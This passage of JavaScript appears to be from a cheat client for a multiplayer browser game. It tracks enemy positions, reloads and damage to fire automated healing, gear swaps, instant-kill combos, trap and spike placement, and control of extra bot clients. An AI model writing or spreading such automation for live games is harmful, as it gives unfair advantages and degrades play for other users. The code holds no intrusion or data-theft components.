        packet("9", undefined, 1);
      }
    }
  } else {
    if (my.autoPush) {
      my.autoPush = false;
      packet("9", undefined, 1);
    }
  }
}

function addDeadPlayer(tmpObj) {
  deadPlayers.push(
    new DeadPlayer(
      tmpObj.x,
      tmpObj.y,
      tmpObj.dir,
      tmpObj.buildIndex,
      tmpObj.weaponIndex,
      tmpObj.weaponVariant,
      tmpObj.skinColor,
      tmpObj.scale,
      tmpObj.name,
      tmpObj.skinIndex,
      tmpObj.tailIndex,
    ),
  );
}

function setInitData(data) {
  alliances = data.teams;
}

function setupGame(yourSID) {
  keys = {};
  macro = {};
  playerSID = yourSID;
  attackState = 0;
  inGame = true;
  packet("d", 0, getAttackDir(), 1);
  my.ageInsta = true;
  if (firstSetup) {
    firstSetup = false;
    gameObjects.length = 0;
    liztobj.length = 0;
  }

  if (player) {
    player.primaryVariant = 0;
    player.secondaryVariant = 0;
  }
  for (let key in weaponVariantCache) {
    delete weaponVariantCache[key];
  }
  for (let i = 0; i < items.weapons.length; i++) {
    const weapon = items.weapons[i];
    if (weapon) {
      drawWeaponIcon("actionBarItem" + i, `./img/weapons/${weapon.src}.png`);
    }
  }
}

let originalName = null;
var playerNames = {};
var playerNamesIds = {};
var pb = {};
function addPlayer(data, isYou) {
  let tmpPlayer = findPlayerByID(data[0]);
  if (isYou) {
    Mod.setPlayer(tmpPlayer);
  }
  if (!tmpPlayer) {
    tmpPlayer = new Player(
      data[0],
      data[1],
      config,
      UTILS,
      projectileManager,
      objectManager,
      players,
      ais,
      items,
      hats,
      accessories,
    );
    players.push(tmpPlayer);
  }
  playerNames[tmpPlayer.sid] = tmpPlayer.name || "unknown";
  playerNamesIds[tmpPlayer.sid] = {
    id: tmpPlayer.sid,
    name: tmpPlayer.name || "unknown",
    Clan: tmpPlayer.team,
  };
  tmpPlayer.spawn(isYou ? true : null);
  tmpPlayer.visible = false;
  tmpPlayer.oldPos = {
    x2: undefined,
    y2: undefined,
  };
  tmpPlayer.x2 = undefined;
  tmpPlayer.y2 = undefined;
  tmpPlayer.x3 = undefined;
  tmpPlayer.y3 = undefined;
  tmpPlayer.setData(data);
  if (isYou) {
    if (!player) {
      window.prepareUI(tmpPlayer);
    }
    player = tmpPlayer;
    camX = player.x;
    camY = player.y;
    originalName = player.name;
    my.lastDir = 0;
    updateItems();
    updateAge();
    updateItemCountDisplay();
    if (player.skins[7]) {
      my.reSync = true;
    }
  }
}

function removePlayer(id) {
  for (let i = 0; i < players.length; i++) {
    if (players[i].id == id) {
      players.splice(i, 1);
      break;
    }
  }
}

function updateHealth(sid, value) {
  let tmpObj = findPlayerBySID(sid);
  if (tmpObj) {
    tmpObj.oldHealth = tmpObj.health;
    tmpObj.health = value;
    tmpObj.judgeShame();

    if (tmpObj.oldHealth > tmpObj.health) {
      tmpObj.timeDamaged = Date.now();
      tmpObj.damaged = tmpObj.oldHealth - tmpObj.health;
      let damaged = tmpObj.damaged;

      if (
        tmpObj.visible &&
        tmpObj.alive &&
        (tmpObj.x2 || tmpObj.x) !== undefined &&
        (tmpObj.y2 || tmpObj.y) !== undefined
      ) {
        createBloodSplatter(
          tmpObj.x2 || tmpObj.x,
          tmpObj.y2 || tmpObj.y,
          damaged,
          tmpObj.sid,
        );
      }

      if (tmpObj.health <= 0 && !tmpObj.death) {
        tmpObj.death = true;
        addDeadPlayer(tmpObj);
      }

      if (tmpObj === player) {
        handlePlayerDamage(tmpObj, damaged);
      } else {
        handleNonPlayerDamage(tmpObj);
      }
    }
  }
}

function handlePlayerDamage(player, damaged) {
  let autoheal = false;
  let antiinsta = configs.antiInsta,
    antiinsta1 = configs.antiInsta,
    antiinsta4 = configs.antiInsta;

  if (AB.Menu.AutoHat) {
    if (player.shameCount > 0 && !my.bullTick) {
      my.bullTick = Math.min(player.shameCount, 6) * 2 + 1;
      buyEquip(7, 0);
    } else if (
      player.shameCount === 0 &&
      player.lastshamecount > 0 &&
      !my.bullTick
    ) {
      buyEquip(6, 0);
    }
  }

  if (inGame) {
    const tickNow = game.tick;
    const msNow = Date.now();
    const lastTick = player._lastDamagedTick || -9999;
    const lastMs = player._lastDamagedMs || 0;
    const inBurst =
      tickNow - lastTick <= 1 || msNow - lastMs <= Math.max(140, game.tickRate * 1.25);
    player._lastDamagedTick = tickNow;
    player._lastDamagedMs = msNow;
    player._burstDamage = inBurst ? (player._burstDamage || 0) + damaged : damaged;

    let attackers = getAttacker(damaged);
    let gearDmgs = [0.25, 0.45].map(
      (val) => val * items.weapons[player.weapons[0]].dmg,
    );
    let includeSpikeDmgs = near.length
      ? !my.bullTick &&
      gearDmgs.includes(damaged) &&
      near[0].skinIndex == 11 &&
      near[0].tailIndex == 21
      : false;
    let healTimeout = 140 - window.ping;

    if (
      damaged >= 0 &&
      damaged <= 66 &&
      player.shameCount === 4 &&
      player.primaryIndex !== "4"
    ) {
      autoheal = configs.autoHeal;
      antiinsta = false;
      antiinsta1 = false;
      antiinsta4 = false;
    } else {
      if (player.shameCount !== 4) {
        autoheal = false;
        antiinsta = configs.antiInsta;
        antiinsta4 = configs.antiInsta;
      }
    }

    if (
      damaged <= 66 &&
      player.shameCount === 3 &&
      player.primaryIndex !== "4"
    ) {
      antiinsta = false;
    } else {
      if (player.shameCount !== 3) {
        antiinsta = configs.antiInsta;
      }
    }

    if (
      damaged <= 66 &&
      player.shameCount === 4 &&
      player.primaryIndex !== "4"
    ) {
      antiinsta1 = true;
    } else {
      if (player.shameCount !== 4) {
        antiinsta1 = false;
      }
    }

    if (damaged >= 0 && damaged <= 90 && player.shameCount === 2) {
      antiinsta4 = false;
    } else {
      if (player.shameCount !== 3) {
        antiinsta4 = configs.antiInsta;
      }
    }

    if (damaged >= 0 && damaged <= 90 && !antiinsta) {
      if (player.shameCount === 3) {
        antiinsta1 = true;
      } else {
        antiinsta1 = false;
      }
    }

    if (
      configs.autoHeal &&
      damaged <= 66 &&
      player.skinIndex != 6 &&
      enemy.weaponIndex === 4
    ) {
      game.tickBase(() => {
        healer1();
      }, 2);
    }

    const burst = player._burstDamage || damaged;
    const hasNear = !!near && typeof near.dist2 === "number";
    const enemyDist = hasNear ? near.dist2 : Infinity;
    const closeEnough = enemyDist <= 320;
    const maxThreat = attackers && attackers.length
      ? attackers.reduce((m, e) => (e && typeof e.damageThreat === "number" ? Math.max(m, e.damageThreat) : m), 0)
      : (typeof player.damageThreat === "number" ? player.damageThreat : 0);
    const reverseInstaDmgs = [18.75, 22.5, 25, 26.25, 30, 35, 37.5, 50];
    const looksLikeInsta =
      closeEnough &&
      (
        burst >= (includeSpikeDmgs ? 42 : 55) ||
        damaged >= (includeSpikeDmgs ? 32 : 45) ||
        (reverseInstaDmgs.includes(damaged) && burst >= 35) ||
        (damaged >= (includeSpikeDmgs ? 8 : 20) && maxThreat >= player.health + 25)
      );

    if (looksLikeInsta && antiinsta4 && game.tick - player.antiTimer > 1) {
      if (player.reloads[53] == 0 && player.reloads[player.weapons[1]] == 0) {
        player.canEmpAnti = true;
      } else {
        player.soldierAnti = true;
      }
      player.antiTimer = game.tick;
      player._antiGearUntilTick = game.tick + 3;
      if (configs.autoHeal) {
        let shame = player.weapons[0] == 4 ? 2 : 5;
        if (player.shameCount < shame) {
          healer();
        } else {
          game.tickBase(() => {
            healer();
          }, 2);
        }
        if (
          looksLikeInsta &&
          autoheal
        ) {
          setTimeout(() => {
            healer();
          }, 120);
        }
      }
    } else if (configs.autoHeal) {
      game.tickBase(() => {
        healer();
      }, 2);
    }

    if (damaged >= 20 && player.skinIndex == 11 && player.shameCount <= 3) {
      instaC.canCounter = true;
    }
  }
}

function handleNonPlayerDamage(tmpObj) {
  if (
    !tmpObj.setPoisonTick &&
    (tmpObj.damaged == 5 || (tmpObj.latestTail == 13 && tmpObj.damaged == 2))
  ) {
    tmpObj.setPoisonTick = true;
    tmpObj.lastPoisonAt = game.tick;
    tmpObj.lastPoisonAtMs = Date.now();
  }
}

function killPlayer(sid) {
  const markerIndex = playerEnemyMarkers.findIndex((m) => m.sid === sid);
  if (markerIndex !== -1) {
    playerEnemyMarkers.splice(markerIndex, 1);
  }

  if (sid === player.sid) {
    inGame = false;
    lastDeath = {
      x: player.x,
      y: player.y,
    };

    player.primaryVariant = 0;
    player.secondaryVariant = 0;
    for (let key in weaponVariantCache) {
      delete weaponVariantCache[key];
    }
    for (let i = 0; i < items.weapons.length; i++) {
      const weapon = items.weapons[i];
      if (weapon) {
        drawWeaponIcon("actionBarItem" + i, `./img/weapons/${weapon.src}.png`);
      }
    }
    if (configs.autoRespawn && lastsp && lastsp.length) {
      packet("M", { name: lastsp[0], moofoll: lastsp[1], skin: lastsp[2] });
    }
  }
}

function updateItemCounts(index, value) {
  if (player) {
    player.itemCounts[index] = value;
    updateItemCountDisplay(index);
  }
}

function updateAge(xp, mxp, age) {
  if (xp != undefined) {
    player.XP = xp;
  }
  if (mxp != undefined) {
    player.maxXP = mxp;
  }
  if (age != undefined) {
    player.age = age;
  }
}

function updateUpgrades(points, age) {
  player.upgradePoints = points;
  player.upgrAge = age;
  if (points > 0) {
    tmpList.length = 0;
    UTILS.removeAllChildren(upgradeHolder);
    for (let i = 0; i < items.weapons.length; ++i) {
      if (
        items.weapons[i].age == age &&
        (items.weapons[i].pre == undefined ||
          player.weapons.indexOf(items.weapons[i].pre) >= 0)
      ) {
        let e = UTILS.generateElement({
          id: "upgradeItem" + i,
          class: "actionBarItem",
          onmouseout: function () {
            showItemInfo();
          },
          parent: upgradeHolder,
        });
        e.style.backgroundImage = getEl(
          "actionBarItem" + i,
        ).style.backgroundImage;
        tmpList.push(i);
      }
    }
    for (let i = 0; i < items.list.length; ++i) {
      if (
        items.list[i].age == age &&
        (items.list[i].pre == undefined ||
          player.items.indexOf(items.list[i].pre) >= 0)
      ) {
        let tmpI = items.weapons.length + i;
        let e = UTILS.generateElement({
          id: "upgradeItem" + tmpI,
          class: "actionBarItem",
          onmouseout: function () {
            showItemInfo();
          },
          parent: upgradeHolder,
        });
        e.style.backgroundImage = getEl(
          "actionBarItem" + tmpI,
        ).style.backgroundImage;
        tmpList.push(tmpI);
      }
    }
    for (let i = 0; i < tmpList.length; i++) {
      (function (i) {
        let tmpItem = getEl("upgradeItem" + i);
        tmpItem.onmouseover = function () {
          if (items.weapons[i]) {
            showItemInfo(items.weapons[i], true);
          } else {
            showItemInfo(items.list[i - items.weapons.length]);
          }
        };
        tmpItem.onclick = UTILS.checkTrusted(function () {
          packet("H", i);
        });
        UTILS.hookTouchEvents(tmpItem);
      })(tmpList[i]);
    }
    if (tmpList.length) {
      upgradeHolder.style.display = "block";
      upgradeCounter.style.display = "block";
      upgradeCounter.innerHTML = "SELECT ITEMS (" + points + ")";
    } else {
      upgradeHolder.style.display = "none";
      upgradeCounter.style.display = "none";
      showItemInfo();
    }
  } else {
    upgradeHolder.style.display = "none";
    upgradeCounter.style.display = "none";
    showItemInfo();
  }
}
let BT = [];
function BreakTracker(b = null, t = "") {
  if (t == "S" && fsd(b, player) > 1300 && b) {
    const { x: bx, y: by } = b;
    BT = BT.filter((track) => fsd({ x: bx, y: by }, track) >= 700);
    BT.push({ x: bx, y: by, time: Date.now() });
    if (BT.length > 6) BT.splice(0, BT.length - 6);
  }
  if (t === "M") {
    const now = Date.now();
    BT = BT.filter((s) => {
      if (now - s.time > 30000) return false;
      mapContext.fillStyle = "#fff";
      mapContext.font = "34px Hammersmith One";
      mapContext.textBaseline = "middle";
      mapContext.textAlign = "center";
      mapContext.fillText(
        "!",
        (s.x / config.mapScale) * mapDisplay.width,
        (s.y / config.mapScale) * mapDisplay.height,
      );
      return true;
    });
  }
}
const killObject = (sid) => {
  const findObj = findObjectBySid(sid);
  objectManager.disableBySid(sid);
  BreakTracker(findObj, "S");

  if (findObj && Mod.AutoBreak && typeof Mod.AutoBreak.aftertrap === "function") {
    Mod.AutoBreak.aftertrap(findObj);
  }

  Mod.Place.replacer(findObj);

  const index = breakObjects.findIndex((obj) => obj.sid === sid);
  if (index !== -1) {
    breakObjects.splice(index, 1);
  }
};

function killObjects(sid) {
  if (player) (objectManager.removeAllItems(sid), playerLeaveGame(sid));
}
function fgdo(a, b) {
  return Math.sqrt(Math.pow(b.y - a.y, 2) + Math.pow(b.x - a.x, 2));
}
function setTickout(doo, timeout) {
  if (!ticks.manage[ticks.tick + timeout]) {
    ticks.manage[ticks.tick + timeout] = [doo];
  } else {
    ticks.manage[ticks.tick + timeout].push(doo);
  }
}

function caf(e, t) {
  try {
    return Math.atan2(
      (t.y2 || t.y) - (e.y2 || e.y),
      (t.x2 || t.x) - (e.x2 || e.x),
    );
  } catch (e) {
    return 0;
  }
}

let found = false;
let autoQ = false;

let autos = {
  insta: {
    todo: false,
    wait: false,
    count: 4,
    shame: 5,
  },
  bull: false,
  antibull: 0,
  reloaded: false,
  stopspin: true,
};

function fadeOut(audio, callback) {
  let volume = audio.volume;
  const fadeInterval = setInterval(() => {
    if (volume >= 0.4) {
      volume -= 0.02;
      audio.volume = Math.max(volume, 0).toFixed(1);
    } else {
      clearInterval(fadeInterval);
      audio.pause();
      audio.volume = 0.4;
      if (callback) callback();
    }
  }, 30);
}

function fadeIn(audio) {
  let volume = 0;
  audio.volume = volume;
  audio.play();
  const fadeInterval = setInterval(() => {
    if (volume <= 0.4) {
      volume += 0.02;
      audio.volume = Math.min(volume, 1).toFixed(1);
    } else {
      clearInterval(fadeInterval);
      audio.volume = 0.4;
    }
  }, 30);
}
function fsd(a, b) {
  if (!a || !b) return Infinity;
  if (Array.isArray(a)) a = { x: a[1], y: a[2] };
  if (Array.isArray(b)) b = { x: b[1], y: b[2] };
  if (a.x == null || a.y == null || b.x == null || b.y == null) return Infinity;
  return Math.hypot(a.y - b.y, a.x - b.x);
}

function updatePlayers(data) {
  if (player && player.alive) {
    if (near && near.dist2 !== undefined && near.dist2 <= 800 && near.alive) {
      const existingIndex = playerEnemyMarkers.findIndex(
        (m) => m.sid === near.sid,
      );
      if (existingIndex !== -1) {
        playerEnemyMarkers[existingIndex].x = near.x2;
        playerEnemyMarkers[existingIndex].y = near.y2;
        playerEnemyMarkers[existingIndex].time = Date.now();
      } else {
        playerEnemyMarkers.push({
          x: near.x2,
          y: near.y2,
          name: near.name,
          sid: near.sid,
          time: Date.now(),
        });
      }
    } else if (!near || !enemy.length) {
      playerEnemyMarkers.length = 0;
    }
  }
  function getAngleDifference(angle1, angle2) {
    angle1 = angle1 % (2 * Math.PI);
    angle2 = angle2 % (2 * Math.PI);
    let diff = Math.abs(angle1 - angle2);
    if (diff > Math.PI) {
      diff = 2 * Math.PI - diff;
    }
    return diff;
  }
  game.tick++;

  let previousNear = near;
  enemy = [];
  nears = [];
  near = [];

  game.tickSpeed = performance.now() - game.lastTick;
  game.lastTick = performance.now();
  players.forEach((tmp) => {
    tmp.forcePos = !tmp.visible;
    tmp.visible = false;
    if (
      tmp.timeHealed - tmp.timeDamaged > 0 &&
      tmp.lastshamecount < tmp.shameCount
    ) {
      tmp.pinge = tmp.timeHealed - tmp.timeDamaged;
    }
  });
  for (let i = 0; i < data.length;) {
    tmpObj = findPlayerBySID(data[i]);
    if (tmpObj) {
      tmpObj.t1 = tmpObj.t2 === undefined ? game.lastTick : tmpObj.t2;
      tmpObj.t2 = game.lastTick;
      tmpObj.oldPos.x2 = tmpObj.x2;
      tmpObj.oldPos.y2 = tmpObj.y2;
      tmpObj.x1 = tmpObj.x;
      tmpObj.y1 = tmpObj.y;
      tmpObj.x2 = data[i + 1];
      tmpObj.y2 = data[i + 2];
      tmpObj.x3 = tmpObj.x2 + (tmpObj.x2 - tmpObj.oldPos.x2);
      tmpObj.y3 = tmpObj.y2 + (tmpObj.y2 - tmpObj.oldPos.y2);
      tmpObj.d1 = tmpObj.d2 === undefined ? data[i + 3] : tmpObj.d2;
      tmpObj.d2 = data[i + 3];
      tmpObj.dt = 0;
      tmpObj.buildIndex = data[i + 4];
      tmpObj.weaponIndex = data[i + 5];
      tmpObj.weaponVariant = data[i + 6];
      tmpObj.team = data[i + 7];
      tmpObj.isLeader = data[i + 8];
      tmpObj.oldSkinIndex = tmpObj.skinIndex;
      tmpObj.oldTailIndex = tmpObj.tailIndex;
      tmpObj.skinIndex = data[i + 9];
      tmpObj.tailIndex = data[i + 10];
      tmpObj.iconIndex = data[i + 11];
      tmpObj.zIndex = data[i + 12];
      tmpObj.visible = true;
      tmpObj.update(game.tickSpeed);
      if (player) {
        tmpObj.dist2 = UTILS.getDist(tmpObj, player, 2, 2);
        tmpObj.aim2 = UTILS.getDirect(tmpObj, player, 2, 2);
        tmpObj.dist3 = UTILS.getDist(tmpObj, player, 3, 3);
        tmpObj.aim3 = UTILS.getDirect(tmpObj, player, 3, 3);
      } else {
        tmpObj.dist2 = Infinity;
        tmpObj.aim2 = 0;
        tmpObj.dist3 = Infinity;
        tmpObj.aim3 = 0;
      }
      tmpObj.damageThreat = 0;
      if (player) Mod.Place.AutoMill();

      if (player) {
        let trap = gameObjects.filter(
          (t) =>
            t.id == 15 &&
            UTILS.getDistance(enemy.x2, enemy.y2, t.x, t.y) <= 50 &&
            (t.owner.sid == player.sid || t.isTeamObject(t.owner.sid)),
        )[0];
        if (trap && trap.hideFromEnemy) {
          trap.hideFromEnemy = false;
        }
      }
      if (tmpObj.skinIndex == 45 && tmpObj.shameTimer <= 0) {
        tmpObj.addShameTimer();
      }
      if (tmpObj.oldSkinIndex == 45 && tmpObj.skinIndex != 45) {
        tmpObj.shameTimer = 0;
        tmpObj.shameCount = 0;
        if (tmpObj == player) {
          healer();
        }
      }

      if (player && near && typeof near.dist3 === "number") {
        if (
          player.shameCount < 4 &&
          near.dist3 <= 300 &&
          near.primaryIndex != null &&
          near.reloads &&
          near.reloads[near.primaryIndex] <=
          game.tickRate * (window.pingTime >= 130 ? 2 : 1)
        ) {
          autoQ = true;
          healer();
        } else {
          if (autoQ) {
            healer();
          }
          autoQ = false;
        }
      }

      if (tmpObj == player) {
        if (liztobj.length) {
          liztobj.forEach((tmp) => {
            tmp.onNear = false;
            if (tmp.active) {
              if (
                !tmp.onNear &&
                UTILS.getDist(tmp, tmpObj, 0, 2) <=
                tmp.scale + items.weapons[tmpObj.weapons[0]].range
              ) {
                tmp.onNear = true;
              }
              if (tmp.isItem && tmp.owner) {
                if (
                  !tmp.pps &&
                  tmpObj.sid == tmp.owner.sid &&
                  UTILS.getDist(tmp, tmpObj, 0, 2) >
                  (parseInt(AB.Menu.breakRange) || 0) &&
                  !tmp.breakObj &&
                  ![13, 14, 20].includes(tmp.id)
                ) {
                  tmp.breakObj = true;
                  breakObjects.push({
                    x: tmp.x,
                    y: tmp.y,
                    sid: tmp.sid,
                  });
                }
              }
            }
          });
          let nearTrap = liztobj
            .filter(
              (e) =>
                e.trap &&
                e.active &&
                UTILS.getDist(e, tmpObj, 0, 2) <=
                tmpObj.scale + e.getScale() + 15 &&
                !e.isTeamObject(tmpObj),
            )
            .sort(function (a, b) {
              return (
                UTILS.getDist(a, tmpObj, 0, 2) - UTILS.getDist(b, tmpObj, 0, 2)
              );
            })[0];
          const prevInTrap = !!traps.inTrap;
          const prevTrapSid = traps.info && traps.info.sid != null ? traps.info.sid : null;
          if (nearTrap) {
            let spike = gameObjects.filter(
              (obj) =>
                obj.dmg &&
                cdf(tmpObj, obj) <= tmpObj.scale + nearTrap.scale / 2 &&
                !obj.isTeamObject(tmpObj) &&
                obj.active,
            )[0];
            traps.dist = UTILS.getDist(nearTrap, tmpObj, 0, 2);
            traps.aim = UTILS.getDirect(spike ? spike : nearTrap, tmpObj, 0, 2);
            traps.inTrap = true;
            traps.info = nearTrap;
          } else {
            traps.inTrap = false;
            traps.info = {};
          }

          const nowInTrap = !!traps.inTrap;
          if (prevInTrap && !nowInTrap && prevTrapSid != null) {
            const trapStillExists = (() => {
              const o = findObjectBySid(prevTrapSid);
              return !!(o && o.active && o.trap);
            })();
            if (trapStillExists) {
              traps.justOutTrap = true;
              clearTimeout(traps._outTrapTimer);
              traps._outTrapTimer = setTimeout(() => {
                traps.justOutTrap = false;
              }, 111);
              Mod.AutoBreak.outtrap();
            }
          }

          traps.currTr = traps.inTrap;
        } else {
          traps.inTrap = false;
        }
      }
      if (tmpObj.weaponIndex < 9) {
        tmpObj.primaryIndex = tmpObj.weaponIndex;
        tmpObj.primaryVariant = tmpObj.weaponVariant;
      } else if (tmpObj.weaponIndex > 8) {
        tmpObj.secondaryIndex = tmpObj.weaponIndex;
        tmpObj.secondaryVariant = tmpObj.weaponVariant;
      }

      if (tmpObj === player) {
        updateWeaponVariantIndicators();
      }
    }
    i += 13;
  }
  if (runAtNextTick.length) {
    runAtNextTick.forEach((tmp) => {
      checkProjectileHolder(...tmp);
    });
    runAtNextTick = [];
  }
  for (let i = 0; i < data.length;) {
    tmpObj = findPlayerBySID(data[i]);
    if (tmpObj) {
      if (player && !tmpObj.isTeam(player) && tmpObj.alive && tmpObj.visible) {
        if (tmpObj.dist2 !== undefined && isFinite(tmpObj.dist2)) {
          tmpObj.trackingFrames = (tmpObj.trackingFrames || 0) + 1;
          tmpObj.lastTrackTime = Date.now();

          enemy.push(tmpObj);

          if (
            tmpObj.dist2 <=
            items.weapons[
              tmpObj.primaryIndex == undefined ? 5 : tmpObj.primaryIndex
            ].range +
            player.scale * 2
          ) {
            nears.push(tmpObj);
          }
        }
      }
      tmpObj.manageReload();
      if (player && tmpObj != player) {
        tmpObj.addDamageThreat(player);
      }
    }
    i += 13;
  }
  if (player && player.alive) {
    if (enemy.length) {
      enemy = enemy.filter(
        (e) =>
          e &&
          e.alive &&
          e.visible &&
          typeof e.x2 === "number" &&
          typeof e.y2 === "number" &&
          isFinite(e.x2) &&
          isFinite(e.y2) &&
          e.dist2 !== undefined &&
          isFinite(e.dist2),
      );

      if (enemy.length > 0) {
        enemy.sort(function (tmp1, tmp2) {
          return tmp1.dist2 - tmp2.dist2;
        });
        near = enemy[0];

        if (near && (!near.alive || !near.visible || !isFinite(near.dist2))) {
          near =
            enemy.find((e) => e.alive && e.visible && isFinite(e.dist2)) || [];
        }
      } else {
        near = [];
      }
    } else {
      near = [];
    }

    Mod.enemy = enemy;
    Mod.near = near;
    Mod.nears = nears;

    if (game.tickQueue[game.tick]) {
      game.tickQueue[game.tick].forEach((action) => {
        action();
      });
      game.tickQueue[game.tick] = null;
    }
    players.forEach((tmp) => {
      if (!tmp.visible && player != tmp) {
        tmp.reloads = {
          0: 0,
          1: 0,
          2: 0,
          3: 0,
          4: 0,
          5: 0,
          6: 0,
          7: 0,
          8: 0,
          9: 0,
          10: 0,
          11: 0,
          12: 0,
          13: 0,
          14: 0,
          15: 0,
          53: 0,
        };
      }
      if (tmp.setBullTick) {
        tmp.bullTimer = 0;
      }
      if (tmp.setPoisonTick) {
        tmp.poisonTimer = 0;
      }
      tmp.updateTimer();
    });
    if (inGame) {
      if (enemy.length) {
        if (!traps.preplaces) traps.preplaces = [[], []];
        traps.preplaces[0] = [];
        traps.preplaces[1] = [];
        if (configs.antiInsta && player && near && typeof near.dist2 === "number" && near.dist2 <= 380) {
          const pingMs =
            typeof window.pingTime === "number"
              ? window.pingTime
              : typeof window.ping === "number"
                ? window.ping
                : 0;
          const margin = Math.min(18, Math.max(6, pingMs / 12));

          const dmgSoon = calcPotentialBurstFuture(near, player, 0.8, false);
          const soldierDmgSoon = calcPotentialBurstFuture(near, { ...player, skinIndex: 6 }, 0.8, false);
          const empDmgSoon = calcPotentialBurstFuture(near, { ...player, skinIndex: 22 }, 0.8, false);

          const extraTrap = traps && traps.inTrap ? 15 : 0;
          const pW = near.weapons?.[0];
          const sW = near.weapons?.[1];
          const pRange = pW == null ? 0 : items.weapons?.[pW]?.range || 0;
          const sRange = sW == null ? 0 : items.weapons?.[sW]?.range || 0;
          const maxRange = Math.max(pRange, sRange);
          const inRange = near.dist2 <= maxRange + near.scale * 1.8 + player.scale * 1.2 + 15;

          const lethalSoon = dmgSoon + extraTrap >= player.health - margin;
          if (inRange && lethalSoon && game.tick - player.antiTimer > 0) {
            const canEmp = near.skins?.[53] && near.reloads?.[53] == 0;
            let desiredHat = 6;
            if (canEmp && empDmgSoon < soldierDmgSoon) desiredHat = 22;

            player.empAnti = desiredHat === 22;
            player.soldierAnti = desiredHat === 6;
            player._antiGearUntilTick = game.tick + 6;
            player.antiTimer = game.tick;
            buyEquip(desiredHat, 0);
          }
        }
        let prehit = liztobj
          .filter(
            (tmp) =>
              tmp.dmg &&
              tmp.active &&
              tmp.isTeamObject(player) &&
              UTILS.getDist(tmp, near, 0, 3) <= tmp.scale + near.scale,
          )
          .sort(function (a, b) {
            return UTILS.getDist(a, near, 0, 2) - UTILS.getDist(b, near, 0, 2);
          })[0];
        if (prehit) {
          if (
            near.dist3 <=
            items.weapons[player.weapons[0]].range + player.scale * 1.8 &&
            configs.predictTick
          ) {
            instaC.canSpikeTick = true;
            instaC.syncHit = true;
            if (
              configs.revTick &&
              player.weapons[1] == 15 &&
              player.reloads[53] == 0 &&
              instaC.perfCheck(player, near)
            ) {
              instaC.revTick = true;
            }
          }
        }
        let antiSpikeTick = liztobj
          .filter(
            (tmp) =>
              tmp.dmg &&
              tmp.active &&
              !tmp.isTeamObject(player) &&
              UTILS.getDist(tmp, player, 0, 3) < tmp.scale + player.scale,
          )
          .sort(function (a, b) {
            return (
              UTILS.getDist(a, player, 0, 2) - UTILS.getDist(b, player, 0, 2)
            );
          })[0];
        if (antiSpikeTick && !traps.inTrap) {
          if (near.dist3 <= items.weapons[5].range + near.scale * 1.8) {
            my.anti0Tick = 1;
          }
        }
        if (configs.anti1tick && my.anti0Tick <= 0) {
          for (let i = 0; i < enemy.length; i++) {
            const tmpObj = enemy[i];
            if (!tmpObj) continue;
            if (tmpObj.primaryIndex == 5 && tmpObj.primaryVariant >= 2) {
              if (tmpObj.dist2 >= 169 && tmpObj.dist2 <= 269) {
                if (tmpObj.skinIndex == 53) {
                  my.anti0Tick = 2;
                  healer1();
                  break;
                }
              }
            }
          }
        }
      }
      if (
        (useWasd
          ? true
          : (player.checkCanInsta(true) >= 100
            ? player.checkCanInsta(true)
            : player.checkCanInsta(false)) >=
          (player.weapons[1] == 10 ? 95 : 100)) &&
        near &&
        near.dist2 !== undefined &&
        near.dist2 <=
        items.weapons[
          player.weapons[1] == 10 ? player.weapons[1] : player.weapons[0]
        ].range +
        near.scale * 1.8 &&
        (instaC.wait || (useWasd && Math.floor(Math.random() * 5) == 0)) &&
        !instaC.isTrue &&
        !my.waitHit &&
        player.reloads[player.weapons[0]] == 0 &&
        player.reloads[player.weapons[1]] == 0 &&
        (useWasd
          ? true
          : AB.Menu.instaType == "oneShot"
            ? player.reloads[53] <=
            (player.weapons[1] == 10 ? 0 : game.tickRate)
            : true) &&
        instaC.perfCheck(player, near)
      ) {
        if (player.checkCanInsta(true) >= 100) {
          instaC.nobull = useWasd ? false : instaC.canSpikeTick ? false : true;
        } else {
          instaC.nobull = false;
        }
        instaC.can = true;

        if (typeof botClients !== "undefined" && botClients.length > 0) {
          botClients.forEach((client) => {
            if (client && client.instakill && client.near) {
              client.instakill.can = true;
            }
          });
        }
      } else {
        instaC.can = false;
      }
      if (macro.q) {
        if (player && player.health < player.maxHealth) {
          if (!window.lastQPlace || Date.now() - window.lastQPlace > 30) {
            place(0, getAttackDir());
            window.lastQPlace = Date.now();
          }
        }
      }
      macro.f && place(4, getSafeDir());
      macro.v && place(2, getSafeDir());
      if (macro.l) {
        let dir;
        if (keys[16]) {
          dir = getMoveDir();
          if (dir === undefined) return;
        } else {
          dir =
            near && near.x2 && near.dist2 < 500
              ? UTILS.getDirect(near, player, 2, 2)
              : Math.atan2(mouseY - screenHeight / 2, mouseX - screenWidth / 2);
        }

        const spikeItem = items.list[player.items[2]];
        const boostItem = items.list[player.items[4]];
        if (!spikeItem || !boostItem) return;

        const spikeRad = spikeItem.scale;
        const boostRad = boostItem.scale;
        const spikeScale =
          player.scale + spikeItem.scale + (spikeItem.placeOffset || 0);
        const boostScale =
          player.scale + boostItem.scale + (boostItem.placeOffset || 0);

        const px = player.x2;
        const py = player.y2;

        const getPos = (scale, angle) => ({
          x: px + Math.cos(angle) * scale,
          y: py + Math.sin(angle) * scale,
        });

        const canPlace = (item, scale, angle) => {
          const p = getPos(scale, angle);
          return objectManager.checkItemLocation(
            p.x,
            p.y,
            item.scale,
            0.6,
            item.id,
            false,
            player,
          );
        };

        const collides = (p1, r1, p2, r2) => {
          const dx = p1.x - p2.x;
          const dy = p1.y - p2.y;
          const minD = r1 + r2 + 2;
          return dx * dx + dy * dy < minD * minD;
        };

        const step = Math.PI / 36;
        let boostA = null;
        let rightA = null;
        let leftA = null;

        for (let bo = 0; bo <= Math.PI / 3 && boostA === null; bo += step) {
          for (const bOff of bo === 0 ? [0] : [bo, -bo]) {
            if (canPlace(boostItem, boostScale, dir + bOff)) {
              boostA = dir + bOff;
              break;
            }
          }
        }

        const rightBase = dir + Math.PI / 2;
        const leftBase = dir - Math.PI / 2;
        const boostPos = boostA !== null ? getPos(boostScale, boostA) : null;

        const findSpike = (baseAngle, avoidPos, avoidRad) => {
          for (let o = 0; o <= Math.PI * 0.7; o += step) {
            for (const off of o === 0 ? [0] : [o, -o]) {
              const a = baseAngle + off;
              if (!canPlace(spikeItem, spikeScale, a)) continue;
              const p = getPos(spikeScale, a);
              if (boostPos && collides(p, spikeRad, boostPos, boostRad))
                continue;
              if (avoidPos && collides(p, spikeRad, avoidPos, avoidRad))
                continue;
              return a;
            }
          }
          return null;
        };

        const findAny = (baseAngle, avoidPos, avoidRad) => {
          for (let a = 0; a < Math.PI * 2; a += step) {
            if (!canPlace(spikeItem, spikeScale, a)) continue;
            const p = getPos(spikeScale, a);
